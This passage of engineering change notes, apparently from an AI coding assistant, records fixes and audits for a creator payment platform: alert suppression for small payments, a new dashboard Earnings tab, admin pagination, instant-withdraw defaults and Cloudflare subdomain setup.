Checked every `sendAlert()` call in the codebase — all seven are
operational (backup failures, health checks, reconciliation mismatches,
withdrawal payout failures). None of them announce an individual
settled payment; no such notification exists in this system today.

Built `should_suppress_payment_alert(amount)` anyway, so if a
per-payment Telegram/Discord notification is ever added, it can respect
the same toggle from day one rather than needing this reasoned through
again later. Reconciliation and health alerts are deliberately NOT
gated by this — those exist to tell admin about real problems in the
true, unfiltered ledger, and must never go quiet because a mismatch
happened to involve a small amount.

## 3. dashboard.html reorganized to match the admin panel's tab pattern

New "🏆 Earnings" tab. Moved off Overview: Charge level (tier progress)
and the Available-vs-earned meter. Overview now holds only the setup
banner, the six stat cards, and the platform notice — a quick glance,
not everything at once.

Added three new cards to the Earnings tab, backed by a new
`get_my_insights()` function: 7-day revenue, 30-day revenue, and
conversion rate (paid / total invoices). Filtered by the same
`small_payment_threshold()` every other creator-facing figure already
respects — a hidden payment is excluded from both sides of the
conversion ratio, not just the numerator, so it never drags the rate
down as a phantom "failure" either.

## 4. Instant Lightning withdraw for new creators — checked, not found

Traced every layer: the `auto_withdraw_enabled` column defaults to
`false` (0017); `handle_new_user()` doesn't set it at all, so new
profiles take that default; `admin_customer_directory()` reads it with
`coalesce(..., false)`; `admin.html`'s per-creator toggle reads that
value directly; `dashboard.html`'s withdraw-method dropdown gates on
`globalAuto && userAuto`, reading the global switch fresh on every load;
`user-withdraw`'s edge function enforces the same pair server-side.
Every layer already defaults to off and already requires both flags.

No fix shipped for this one — nothing wrong was found in the code. Most
likely explanation: the earlier fix (dashboard.html + user-withdraw)
hasn't reached the live Supabase/GitHub yet. Re-shipped both files
unchanged to remove any doubt about what's live, plus a verification
query to check the actual values in the live database directly.

---

# Six items, September 2026 (third round)

## 1. Admin "Load more" resetting itself

`admin.html`'s 15-second auto-refresh called `loadAllPayments(false)` —
which reset the offset to 0 and re-fetched only page one, discarding
whatever "Load more" progress the admin had made, every 15 seconds.

Fixed by giving `loadAllPayments` three explicit modes instead of one
boolean: `'reset'` (first load / filter change), `'more'` (Load more
button), `'refresh'` (the timer). Refresh re-fetches exactly as many
rows as are already on screen — in `ADMIN_PAY_MAX`-sized (200-row)
chunks if that is more than one page — and replaces the array in place,
so live data keeps flowing without ever losing scroll depth.

Verified in browser: loaded 400 rows via three "Load more" clicks,
simulated the 15-second refresh firing, confirmed all 400 rows survived
with no duplicate ids.

## 2. Small-payment history reaching Telegram/Discord

Audited every `sendAlert()` call in the codebase (7, across
`btcpay-webhook`, `daily-report`, `health`, `ledger-backup`,
`reconcile`, `user-withdraw`) — every single one is an *operational
failure* alert (BTCPay unreachable, a payout rejected, a health check
failing). None of them announce an individual settled payment; no such
notification exists anywhere in this system today, so there was nothing
currently leaking.

Built `should_suppress_payment_alert(amount)` as ready infrastructure
for if a "payment settled" notification is ever added — it respects the
same toggle and the same strict-under-$10 boundary as everything else —
but did not invent a new per-payment Telegram feature that wasn't asked
for. `reconcile` and `health`'s own alerts stay deliberately unfiltered:
they are admin-only integrity tools, and filtering them would let a real
discrepancy hide behind the same toggle that is supposed to only affect
what creators and moderators see.

## 3. Creator dashboard redesigned into an Earnings tab

New "Earnings" tab holds what used to be crammed into Overview: the
Charge level / tier progress, and the Available-vs-earned meter — plus
three new figures from a new `get_my_insights()` function: 7-day
revenue, 30-day revenue, and conversion rate (paid ÷ total invoices).

Every one of these three new figures is filtered by the same
`small_payment_threshold()` as the rest of the dashboard, for one
reason: "Total earned" on Overview and "30-day revenue" on Earnings
describe the same underlying payments, or the difference between them
reads as a bug rather than a feature. Conversion rate excludes a hidden
payment from *both* sides of the ratio — a probe payment invisible
everywhere else on the dashboard should not silently count as an
uncounted "failed" invoice either.

Overview and Transactions remain the first two tabs, unchanged.

## 4. Instant-Lightning-default bug

Re-verified all four layers directly against the code:

- `profiles.auto_withdraw_enabled boolean default false` (0017) — a new
  row gets `false` with no help from anywhere else.
- `handle_new_user()` never touches this column.
- `dashboard.html` only offers Lightning when `globalAuto && userAuto`.
- `user-withdraw` enforces the identical double-check server-side.

All four are correct. No bug found in the code. `VERIFY-lightning-default.sql`
was written so the owner can check their *live* database directly rather
than take "the code looks right" on faith — it reports the actual value
of the global switch and a new creator's own flag side by side, with a
plain-language verdict for each combination. The most likely explanation
given everything else checks out: the deployed `dashboard.html` or
`user-withdraw` predates this fix and needs redeploying.

## 5. `pay.boltpay.io` and Cloudflare

Confirmed against current Cloudflare documentation (fetched fresh, not
from training data): a subdomain of a domain *already* on Cloudflare
does not need its own zone. Adding `pay.boltpay.io` is just "Set up a
domain" in the Pages/Workers project's Custom Domains settings —
Cloudflare creates the DNS record automatically. `site_domains.purpose`
(`'payment' | 'site' | 'both'`, migration 0015) already exists in this
schema specifically to support serving payment links from a different
hostname than the main site, so this is a supported, built-in choice —
not a requirement.

## Verified

54 migrations parse clean, all 8 Edge Functions build, frontend static
checks pass, every `rpc()` call matches its SQL definition, `.github/workflows/verify.yml`
and `supabase/config.toml` both valid.
